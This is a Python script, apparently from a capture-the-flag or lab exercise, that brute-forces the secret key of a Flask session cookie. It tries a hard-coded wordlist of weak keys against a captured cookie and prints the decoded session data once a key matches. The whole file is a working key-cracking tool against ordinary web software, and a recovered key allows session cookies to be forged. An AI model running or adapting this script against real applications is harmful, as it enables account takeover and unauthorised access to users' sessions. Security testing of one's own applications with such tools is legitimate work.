import hashlib
from itsdangerous import URLSafeTimedSerializer, BadSignature
from flask.sessions import TaggedJSONSerializer

def decode_session_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    try:
        print(f"Attempting to decode with secret key: {secret_key}")
        decoded_data = s.loads(cookie_str, return_timestamp=True)
        print(f"Decoded data: {decoded_data}")
        return decoded_data
    except BadSignature as e:
        print(f"BadSignature exception: {e}")
        return None

def brute_force_secret_key(possible_keys, cookie_str):
    for secret_key in possible_keys:
        decoded_data = decode_session_cookie(secret_key, cookie_str)
        if decoded_data:
            print(f'Successfully decoded session cookie with secret key: {secret_key}')
            print(f'Decoded data: {decoded_data}')
            return decoded_data
    print('Failed to decode session cookie with any of the provided secret keys')
    return None

# Example usage
if __name__ == '__main__':
    # List of possible secret keys
    possible_keys = [
        '0',
        '1',
        'toller_secret_key',
        '2',
        '3',
        '4',
        '5',
        '6',
        '7',
        '8',
        '9',
        'secret',
        'abc',
        'def'
    ]

    cookie_str = 'eyJ1c2VybmFtZSI6ImFhcm9uIn0.aWXzDQ.I6bkjjnSPzK02gl0r9UwrhJX8mY'

    brute_force_secret_key(possible_keys, cookie_str)
